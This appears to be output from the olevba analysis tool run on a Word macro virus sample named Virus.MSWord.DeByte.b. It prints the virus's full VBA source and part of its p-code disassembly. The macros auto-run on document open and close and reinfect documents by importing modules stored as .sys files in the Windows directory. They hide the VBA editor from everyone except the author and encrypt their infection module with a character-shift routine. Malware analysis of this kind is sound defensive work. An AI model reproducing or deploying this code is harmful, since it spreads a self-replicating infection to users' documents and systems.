olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.DeByte.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.DeByte.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.DeByte.b - OLE stream: 'Macros/VBA/autoclose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
 virus_test = 30
 For Each VbComponent In ActiveDocument.VBProject.VBComponents
    On Error GoTo Vir_ok
    If VbComponent.Name = "Dead_Byte" Then virus_test = 54
 Next
 If virus_test = 100 Then GoTo Vir_ok
 Call I_d.I_d
Vir_ok:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileClose.bas 
in file: ./Virus.MSWord.DeByte.b - OLE stream: 'Macros/VBA/Fileclose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileClose()
 virus_test = 21
 For Each VbComponent In ActiveDocument.VBProject.VBComponents
    On Error GoTo Vir_ok
    If VbComponent.Name = "Dead_Byte" Then virus_test = 54
 Next
 If virus_test = 54 Then GoTo Vir_ok
 Call I_d.I_d
Vir_ok:
 WordBasic.FileClose
End Sub
-------------------------------------------------------------------------------
VBA MACRO Dead_Byte.bas 
in file: ./Virus.MSWord.DeByte.b - OLE stream: 'Macros/VBA/Dead_Byte'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Dead_Byte()
End Sub
-------------------------------------------------------------------------------
VBA MACRO System.bas 
in file: ./Virus.MSWord.DeByte.b - OLE stream: 'Macros/VBA/System'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Sub ViewVBCode(): Stealth: End Sub
Sub FileTemplates(): Stealth: End Sub
Sub ToolsMacro(): Stealth: End Sub
Private Sub Stealth()
 u_name$ = "         "
 b = GetUserName(u_name$, 101)
 On Error Resume Next
 If u_name$ <> "Dead_Byte" Then Application.ShowVisualBasicEditor = 0
 If u_name$ = "Dead_Byte" Then Application.ShowVisualBasicEditor = 1
 Application.EnableCancelKey = 0
End Sub


-------------------------------------------------------------------------------
VBA MACRO I_nc.bas 
in file: ./Virus.MSWord.DeByte.b - OLE stream: 'Macros/VBA/I_nc'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Sub I_n()
'Inr wnsif Fx Xywnsl
'wnsif B "                                                                           "
's B LjyWnsitwxInwjhytwy(wnsif, 255)
'wnsif B Qjky$(wnsif, s)
'yds B 1
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("IjfidGyyj").Jxutwy wnsif + "awnsix1.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("KnqjTujs").Jxutwy wnsif + "awnsix2.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("FzytTujs").Jxutwy wnsif + "awnsix3.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("FzytHqtxj").Jxutwy wnsif + "awnsix4.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("KnqjHqtxj").Jxutwy wnsif + "awnsix5.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Ndi").Jxutwy wnsif + "awnsix6.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Ndsh").Jxutwy wnsif + "awnsix7.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Xyxyjr").Jxutwy wnsif + "awnsix8.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Ndsh").Jxutwy wnsif + "awnsix9.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("YRU").Jxutwy wnsif + "awnsix10.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Hwnuytw").Jxutwy wnsif + "awnsix11.xyx"
'Ktw o B 1 Yt WtwiGfxnh.HtzsyRfhwtx(0, 0)
' Nk WtwiGfxnh.[RfhwtSfrj$b(o, 0, 0) B "IjfidGyyj" Ymjs yds B 100
'Sjxy o
'Nk yds B 100 Ymjs LtYt tp
'kdsfrj$ B WtwiGfxnh.[KnqjSfrj$b()
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":IjfidGyyj", "Stwrfq:IjfidGyyj"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":KnqjTujs", "Stwrfq:KnqjTujs"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":KnqjHqtxj", "Stwrfq:KnqjHqtxj"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":FzytHqtxj", "Stwrfq:FzytHqtxj"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":Ndi", "Stwrfq:Ndi"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":Ndsh", "Stwrfq:Ndsh"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":YRU", "Stwrfq:YRU"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":Hwnuytw", "Stwrfq:Hwnuytw"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":Xyxyjr", "Stwrfq:Xyxyjr"
'tp:
End Sub




-------------------------------------------------------------------------------
VBA MACRO Criptor.bas 
in file: ./Virus.MSWord.DeByte.b - OLE stream: 'Macros/VBA/Criptor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub cript()
Set t = ActiveDocument.VBProject.VBComponents("I_n")
Set t_tmp = ActiveDocument.VBProject.VBComponents("TMP")
z$ = "%"
i = 3
l1:
 z$ = MacroContainer.VBProject.VBComponents("I_n").CodeModule.Lines(i, 1)
 z_tmp$ = MacroContainer.VBProject.VBComponents("TMP").CodeModule.Lines(i - 2, 1)
 If MacroContainer.VBProject.VBComponents("I_n").CodeModule.Lines(i + 1, 1) = "" Then GoTo l2
 nz$ = "'"
 nz_tmp$ = "'"
 For j = 1 To Len(z$)
  If (((Asc(Mid(z$, j, 1)) + 5) > 64) And ((Asc(Mid(z$, j, 1)) + 5) < 91)) Or (((Asc(Mid(z$, j, 1)) + 5) > 96) And ((Asc(Mid(z$, j, 1)) + 5) < 123)) Then
   nz$ = nz$ + Chr$(Asc(Mid(z$, j, 1)) + 5)
   nz_tmp$ = nz_tmp$ + "0"
  End If
  If ((Asc(Mid(z$, j, 1)) + 5) < 65) Or (((Asc(Mid(z$, j, 1)) + 5) > 90) And ((Asc(Mid(z$, j, 1)) + 5) < 97)) Or ((Asc(Mid(z$, j, 1)) + 5) > 122) Then
   nz$ = nz$ + Chr$(Asc(Mid(z$, j, 1)))
   nz_tmp$ = nz_tmp$ + "1"
  End If
 Next j
 zz = t.CodeModule.deletelines(i, 1)
 zz = t.CodeModule.InsertLines(i, nz$)
 'zz_tmp = t_tmp.CodeModule.InsertLines(i - 2, nz_tmp$)
 i = i + 1
GoTo l1
l2:
ActiveDocument.SaveAs
End Sub
Sub decript()
Set t = ActiveDocument.VBProject.VBComponents("I_n")
Set t_tmp = ActiveDocument.VBProject.VBComponents("TMP")
z$ = "%"
i = 3
l1:
 z$ = MacroContainer.VBProject.VBComponents("I_n").CodeModule.Lines(i, 1)
 z_tmp$ = MacroContainer.VBProject.VBComponents("TMP").CodeModule.Lines(i - 2, 1)
 If MacroContainer.VBProject.VBComponents("I_n").CodeModule.Lines(i + 1, 1) = "" Then GoTo l2
 nz$ = ""
 nz_tmp$ = ""
 For j = 2 To Len(z$)
  If Mid(z_tmp$, j, 1) = "0" Then
   nz$ = nz$ + Chr$(Asc(Mid(z$, j, 1)) - 5)
  End If
  If Mid(z_tmp$, j, 1) = "1" Then
   nz$ = nz$ + Mid(z$, j, 1)
  End If
 Next j
 zz = t.CodeModule.deletelines(i, 1) 'номер,кол-ко
 zz = t.CodeModule.InsertLines(i, nz$)
 i = i + 1
GoTo l1
l2:
'zz = t_tmp.CodeModule.deletelines(1, t_tmp.CodeModule.CountOfLines)
ActiveDocument.SaveAs
End Sub
-------------------------------------------------------------------------------
VBA MACRO Autoopen.bas 
in file: ./Virus.MSWord.DeByte.b - OLE stream: 'Macros/VBA/autoopen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Autoopen()
 Call Criptor.decript
 Call I_n.I_n
 Call Criptor.cript
End Sub

-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: ./Virus.MSWord.DeByte.b - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileOpen()
virus_test = 21
dialog_test = Dialogs(wdDialogFileOpen).Show
If dialog_test = 0 Then GoTo Vir_ok
On Error GoTo Vir_ok
For Each VbComponent In ActiveDocument.VBProject.VBComponents
    On Error GoTo Vir_ok
    If VbComponent.Name = "Dead_Byte" Then virus_test = 54
Next
If virus_test = 54 Then GoTo Vir_ok
Call I_d.I_d
Vir_ok:
End Sub
-------------------------------------------------------------------------------
VBA MACRO I_n.bas 
in file: ./Virus.MSWord.DeByte.b - OLE stream: 'Macros/VBA/I_n'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Sub I_n()
'Inr wnsif Fx Xywnsl
'wnsif B "                                                                           "
's B LjyWnsitwxInwjhytwy(wnsif, 255)
'wnsif B Qjky$(wnsif, s)
'yds B 1
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("IjfidGyyj").Jxutwy wnsif + "awnsix1.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("KnqjTujs").Jxutwy wnsif + "awnsix2.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("FzytTujs").Jxutwy wnsif + "awnsix3.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("FzytHqtxj").Jxutwy wnsif + "awnsix4.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("KnqjHqtxj").Jxutwy wnsif + "awnsix5.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Ndi").Jxutwy wnsif + "awnsix6.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Ndsh").Jxutwy wnsif + "awnsix7.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Xyxyjr").Jxutwy wnsif + "awnsix8.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Ndsh").Jxutwy wnsif + "awnsix9.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("YRU").Jxutwy wnsif + "awnsix10.xyx"
'FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Hwnuytw").Jxutwy wnsif + "awnsix11.xyx"
'Ktw o B 1 Yt WtwiGfxnh.HtzsyRfhwtx(0, 0)
' Nk WtwiGfxnh.[RfhwtSfrj$b(o, 0, 0) B "IjfidGyyj" Ymjs yds B 100
'Sjxy o
'Nk yds B 100 Ymjs LtYt tp
'kdsfrj$ B WtwiGfxnh.[KnqjSfrj$b()
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":IjfidGyyj", "Stwrfq:IjfidGyyj"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":KnqjTujs", "Stwrfq:KnqjTujs"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":KnqjHqtxj", "Stwrfq:KnqjHqtxj"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":FzytHqtxj", "Stwrfq:FzytHqtxj"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":Ndi", "Stwrfq:Ndi"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":Ndsh", "Stwrfq:Ndsh"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":YRU", "Stwrfq:YRU"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":Hwnuytw", "Stwrfq:Hwnuytw"
'WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":Xyxyjr", "Stwrfq:Xyxyjr"
'tp:
End Sub




-------------------------------------------------------------------------------
VBA MACRO I_d.bas 
in file: ./Virus.MSWord.DeByte.b - OLE stream: 'Macros/VBA/I_d'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Sub I_d()
Dim m(100)
Dim winda As String
Randomize (Timer)
winda = "                                                                           "
n = GetWindowsDirectory(winda, 255)
winda = Left$(winda, n)
min = 1: max = 11: z = 0
For i = 1 To max
    m(i) = 0
Next i
SS:
c = Int((max + min - 1) * Abs(Rnd) + min)
For i = 1 To max
    If c = m(i) Then c = 100
Next i
If c <> 100 Then: z = z + 1: m(z) = c
If z < max Then GoTo SS

For i = 1 To max
If m(i) = 1 Then ActiveDocument.VBProject.VBComponents.Import winda + "\winds1.sys"
If m(i) = 2 Then ActiveDocument.VBProject.VBComponents.Import winda + "\winds2.sys"
If m(i) = 3 Then ActiveDocument.VBProject.VBComponents.Import winda + "\winds3.sys"
If m(i) = 4 Then ActiveDocument.VBProject.VBComponents.Import winda + "\winds4.sys"
If m(i) = 5 Then ActiveDocument.VBProject.VBComponents.Import winda + "\winds5.sys"
If m(i) = 6 Then ActiveDocument.VBProject.VBComponents.Import winda + "\winds6.sys"
If m(i) = 7 Then ActiveDocument.VBProject.VBComponents.Import winda + "\winds7.sys"
If m(i) = 8 Then ActiveDocument.VBProject.VBComponents.Import winda + "\winds8.sys"
If m(i) = 9 Then ActiveDocument.VBProject.VBComponents.Import winda + "\winds9.sys"
If m(i) = 10 Then ActiveDocument.VBProject.VBComponents.Import winda + "\winds10.sys"
If m(i) = 11 Then ActiveDocument.VBProject.VBComponents.Import winda + "\winds11.sys"
Next i
ActiveDocument.VBProject.VBComponents("I_nc1").Name = "I_n"
ActiveDocument.SaveAs
End Sub

-------------------------------------------------------------------------------
VBA MACRO TMP.bas 
in file: ./Virus.MSWord.DeByte.b - OLE stream: 'Macros/VBA/TMP'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'0001100001001000000
'1000010111111111111111111111111111111111111111111111111111111111111111111111111111111
'01010001000010000000001110000111111
'10000101000011100001101
'0001011
'0000100000000011000000001100000000000110000001001110100001100001111010000110101
'000010000000001100000000110000000000011000000001110100001100001111010000110101
'000010000000001100000000110000000000011000000001110100001100001111010000110101
'0000100000000011000000001100000000000110000000001110100001100001111010000110101
'0000100000000011000000001100000000000110000000001110100001100001111010000110101
'0000100000000011000000001100000000000110001110100001100001111010000110101
'00001000000000110000000011000000000001100001110100001100001111010000110101
'0000100000000011000000001100000000000110100001110100001100001111010000110101
'00001000000000110000000011000000000001100001110100001100001111010000110101
'00001000000000110000000011000000000001100011101000011000011110100001110101
'000010000000001100000000110000000000011000000011101000011000011110100001110101
'0001010111001100000000100000000000111111
'1001100000000110000000001010111111110110000001001100001000101111
'001010
'0010001011111000010000100
'000000110110000000011000000001011
'10000000010000000011000000111111000000100111100000010000001001
'100000000100000000110000001111110000000011110000001000000001
'10000000010000000011000000111111000000000111100000010000000001
'10000000010000000011000000111111000000000111100000010000000001
'10000000010000000011000000111111000111100000010001
'1000000001000000001100000011111100001111000000100001
'10000000010000000011000000111111000111100000010001
'1000000001000000001100000011111100000001111000000100000001
'10000000010000000011000000111111010000111100000010100001
'001
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.DeByte.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/autoclose - 1207 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	LitDI2 0x001E 
' 	St virus_test 
' Line #2:
' 	StartForVariable 
' 	Ld VbComponent 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #3:
' 	OnError Vir_ok 
' Line #4:
' 	Ld VbComponent 
' 	MemLd New 
' 	LitStr 0x0009 "Dead_Byte"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0036 
' 	St virus_test 
' 	EndIf 
' Line #5:
' 	StartForVariable 
' 	Next 
' Line #6:
' 	Ld virus_test 
' 	LitDI2 0x0064 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Vir_ok 
' 	EndIf 
' Line #7:
' 	Ld I_d 
' 	ArgsMemCall (Call) I_d 0x0000 
' Line #8:
' 	Label Vir_ok 
' Line #9:
' 	EndSub 
' Macros/VBA/Fileclose - 1249 bytes
' Line #0:
' 	FuncDefn (Sub FileClose())
' Line #1:
' 	LitDI2 0x0015 
' 	St virus_test 
' Line #2:
' 	StartForVariable 
' 	Ld VbComponent 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #3:
' 	OnError Vir_ok 
' Line #4:
' 	Ld VbComponent 
' 	MemLd New 
' 	LitStr 0x0009 "Dead_Byte"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0036 
' 	St virus_test 
' 	EndIf 
' Line #5:
' 	StartForVariable 
' 	Next 
' Line #6:
' 	Ld virus_test 
' 	LitDI2 0x0036 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Vir_ok 
' 	EndIf 
' Line #7:
' 	Ld I_d 
' 	ArgsMemCall (Call) I_d 0x0000 
' Line #8:
' 	Label Vir_ok 
' Line #9:
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0000 
' Line #10:
' 	EndSub 
' Macros/VBA/Dead_Byte - 796 bytes
' Line #0:
' 	FuncDefn (Sub Dead_Byte())
' Line #1:
' 	EndSub 
' Macros/VBA/System - 1863 bytes
' Line #0:
' 	FuncDefn (Private Declare Function GetUserName Lib "advapi32.dll" (ByVal lpBuffer As String, nSize As Long) As Long)
' Line #1:
' 	FuncDefn (Sub ViewVBCode())
' 	BoS 0x0000 
' 	ArgsCall Stealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #2:
' 	FuncDefn (Sub FileTemplates())
' 	BoS 0x0000 
' 	ArgsCall Stealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #3:
' 	FuncDefn (Sub ToolsMacro())
' 	BoS 0x0000 
' 	ArgsCall Stealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #4:
' 	FuncDefn (Private Sub Stealth())
' Line #5:
' 	LitStr 0x0009 "         "
' 	St u_name$ 
' Line #6:
' 	Ld u_name$ 
' 	LitDI2 0x0065 
' 	ArgsLd GetUserName 0x0002 
' 	St B 
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' 	Ld u_name$ 
' 	LitStr 0x0009 "Dead_Byte"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' 	EndIf 
' Line #9:
' 	Ld u_name$ 
' 	LitStr 0x0009 "Dead_Byte"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' 	EndIf 
' Line #10:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #11:
' 	EndSub 
' Line #12:
' Line #13:
' Macros/VBA/I_nc - 4028 bytes
' Line #0:
' 	FuncDefn (Private Declare Function GetWindowsDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #1:
' 	FuncDefn (Sub I_n())
' Line #2:
' 	QuoteRem 0x0000 0x0013 "Inr wnsif Fx Xywnsl"
' Line #3:
' 	QuoteRem 0x0000 0x0055 "wnsif B "                                                                           ""
' Line #4:
' 	QuoteRem 0x0000 0x0023 "s B LjyWnsitwxInwjhytwy(wnsif, 255)"
' Line #5:
' 	QuoteRem 0x0000 0x0017 "wnsif B Qjky$(wnsif, s)"
' Line #6:
' 	QuoteRem 0x0000 0x0007 "yds B 1"
' Line #7:
' 	QuoteRem 0x0000 0x004F "FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("IjfidGyyj").Jxutwy wnsif + "awnsix1.xyx""
' Line #8:
' 	QuoteRem 0x0000 0x004E "FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("KnqjTujs").Jxutwy wnsif + "awnsix2.xyx""
' Line #9:
' 	QuoteRem 0x0000 0x004E "FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("FzytTujs").Jxutwy wnsif + "awnsix3.xyx""
' Line #10:
' 	QuoteRem 0x0000 0x004F "FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("FzytHqtxj").Jxutwy wnsif + "awnsix4.xyx""
' Line #11:
' 	QuoteRem 0x0000 0x004F "FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("KnqjHqtxj").Jxutwy wnsif + "awnsix5.xyx""
' Line #12:
' 	QuoteRem 0x0000 0x0049 "FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Ndi").Jxutwy wnsif + "awnsix6.xyx""
' Line #13:
' 	QuoteRem 0x0000 0x004A "FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Ndsh").Jxutwy wnsif + "awnsix7.xyx""
' Line #14:
' 	QuoteRem 0x0000 0x004C "FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Xyxyjr").Jxutwy wnsif + "awnsix8.xyx""
' Line #15:
' 	QuoteRem 0x0000 0x004A "FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Ndsh").Jxutwy wnsif + "awnsix9.xyx""
' Line #16:
' 	QuoteRem 0x0000 0x004A "FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("YRU").Jxutwy wnsif + "awnsix10.xyx""
' Line #17:
' 	QuoteRem 0x0000 0x004E "FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Hwnuytw").Jxutwy wnsif + "awnsix11.xyx""
' Line #18:
' 	QuoteRem 0x0000 0x0028 "Ktw o B 1 Yt WtwiGfxnh.HtzsyRfhwtx(0, 0)"
' Line #19:
' 	QuoteRem 0x0000 0x0040 " Nk WtwiGfxnh.[RfhwtSfrj$b(o, 0, 0) B "IjfidGyyj" Ymjs yds B 100"
' Line #20:
' 	QuoteRem 0x0000 0x0006 "Sjxy o"
' Line #21:
' 	QuoteRem 0x0000 0x0019 "Nk yds B 100 Ymjs LtYt tp"
' Line #22:
' 	QuoteRem 0x0000 0x0021 "kdsfrj$ B WtwiGfxnh.[KnqjSfrj$b()"
' Line #23:
' 	QuoteRem 0x0000 0x003E "WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":IjfidGyyj", "Stwrfq:IjfidGyyj""
' Line #24:
' 	QuoteRem 0x0000 0x003C "WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":KnqjTujs", "Stwrfq:KnqjTujs""
' Line #25:
' 	QuoteRem 0x0000 0x003E "WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":KnqjHqtxj", "Stwrfq:KnqjHqtxj""
' Line #26:
' 	QuoteRem 0x0000 0x003E "WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":FzytHqtxj", "Stwrfq:FzytHqtxj""
' Line #27:
' 	QuoteRem 0x0000 0x0032 "WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":Ndi", "Stwrfq:Ndi""
' Line #28:
' 	QuoteRem 0x0000 0x0034 "WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":Ndsh", "Stwrfq:Ndsh""
' Line #29:
' 	QuoteRem 0x0000 0x0032 "WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":YRU", "Stwrfq:YRU""
' Line #30:
' 	QuoteRem 0x0000 0x003A "WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":Hwnuytw", "Stwrfq:Hwnuytw""
' Line #31:
' 	QuoteRem 0x0000 0x0038 "WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":Xyxyjr", "Stwrfq:Xyxyjr""
' Line #32:
' 	QuoteRem 0x0000 0x0003 "tp:"
' Line #33:
' 	EndSub 
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Macros/VBA/Criptor - 3817 bytes
' Line #0:
' 	FuncDefn (Sub cript())
' Line #1:
' 	SetStmt 
' 	LitStr 0x0003 "I_n"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set t 
' Line #2:
' 	SetStmt 
' 	LitStr 0x0003 "TMP"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set t_tmp 
' Line #3:
' 	LitStr 0x0001 "%"
' 	St z$ 
' Line #4:
' 	LitDI2 0x0003 
' 	St i 
' Line #5:
' 	Label l1 
' Line #6:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitStr 0x0003 "I_n"
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St z$ 
' Line #7:
' 	Ld i 
' 	LitDI2 0x0002 
' 	Sub 
' 	LitDI2 0x0001 
' 	LitStr 0x0003 "TMP"
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St z_tmp$ 
' Line #8:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	LitStr 0x0003 "I_n"
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo l2 
' 	EndIf 
' Line #9:
' 	LitStr 0x0001 "'"
' 	St nz$ 
' Line #10:
' 	LitStr 0x0001 "'"
' 	St nz_tmp$ 
' Line #11:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld z$ 
' 	FnLen 
' 	For 
' Line #12:
' 	Ld z$ 
' 	Ld j 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0005 
' 	Add 
' 	Paren 
' 	LitDI2 0x0040 
' 	Gt 
' 	Paren 
' 	Ld z$ 
' 	Ld j 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0005 
' 	Add 
' 	Paren 
' 	LitDI2 0x005B 
' 	Lt 
' 	Paren 
' 	And 
' 	Paren 
' 	Ld z$ 
' 	Ld j 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0005 
' 	Add 
' 	Paren 
' 	LitDI2 0x0060 
' 	Gt 
' 	Paren 
' 	Ld z$ 
' 	Ld j 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0005 
' 	Add 
' 	Paren 
' 	LitDI2 0x007B 
' 	Lt 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #13:
' 	Ld nz$ 
' 	Ld z$ 
' 	Ld j 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0005 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St nz$ 
' Line #14:
' 	Ld nz_tmp$ 
' 	LitStr 0x0001 "0"
' 	Add 
' 	St nz_tmp$ 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Ld z$ 
' 	Ld j 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0005 
' 	Add 
' 	Paren 
' 	LitDI2 0x0041 
' 	Lt 
' 	Paren 
' 	Ld z$ 
' 	Ld j 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0005 
' 	Add 
' 	Paren 
' 	LitDI2 0x005A 
' 	Gt 
' 	Paren 
' 	Ld z$ 
' 	Ld j 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0005 
' 	Add 
' 	Paren 
' 	LitDI2 0x0061 
' 	Lt 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
